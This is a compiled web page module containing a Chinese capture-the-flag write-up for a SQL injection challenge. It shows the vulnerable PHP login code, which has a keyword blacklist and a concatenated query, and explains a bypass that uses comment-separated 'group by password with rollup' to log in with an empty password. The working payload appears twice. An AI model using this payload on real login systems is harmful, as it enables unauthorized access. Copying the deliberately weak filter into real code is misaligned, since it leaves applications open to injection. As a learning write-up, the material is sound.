import{_ as e,o as n,c as s,e as i}from"./app-R-nj5o9Q.js";const t={},l=i(`<p>#SQL注入 点击取消，自动下载源码文件index.phps：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?php
		$flag=&quot;&quot;;
        function replaceSpecialChar($strParam){
             $regex = &quot;/(select|from|where|join|sleep|and|\\s|union|,)/i&quot;;
             return preg_replace($regex,&quot;&quot;,$strParam);
        }
        if (!$con)
        {
            die(&#39;Could not connect: &#39; . mysqli_error());
        }
		if(strlen($username)!=strlen(replaceSpecialChar($username))){
			die(&quot;sql inject error&quot;);
		}
		if(strlen($password)!=strlen(replaceSpecialChar($password))){
			die(&quot;sql inject error&quot;);
		}
		$sql=&quot;select * from user where username = &#39;$username&#39;&quot;;
		$result=mysqli_query($con,$sql);
			if(mysqli_num_rows($result)&gt;0){
					while($row=mysqli_fetch_assoc($result)){
						if($password==$row[&#39;password&#39;]){
							echo &quot;登陆成功&lt;br&gt;&quot;;
							echo $flag;
						}

					 }
			}
    ?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>我们使用万能用户名 a&#39;/**/or/**/true/**/# 使SQL成立绕过用户名之后, 后台的SQL会查询出所有的用户信息, 然后依次判断查询处的用户名对应的密码和我们输入的密码是否相同, 这时候我们使用with rollup 对 group by 分组的结果再次进行求和统计, 由于with rollup 不会对group by 分组的字段( password)进行统计, 所以会在返回结果的最后一行用null来填充password, 这样一来我们的返回结果中就有了一个值为null的password , 只要我们登录的时候password输入框什么都不输, 那我么输入的password的值就是null, 跟查询出的用户密码相同( null == null), 从而登录成功！！
原文链接：https://blog.csdn.net/qq_52907838/article/details/120416707
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>payload:\`username=admin&#39;/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=\`
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&#39;/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,5),r=[l];function d(a,u){return n(),s("div",null,r)}const o=e(t,[["render",d],["__file","web10.html.vue"]]);export{o as default};
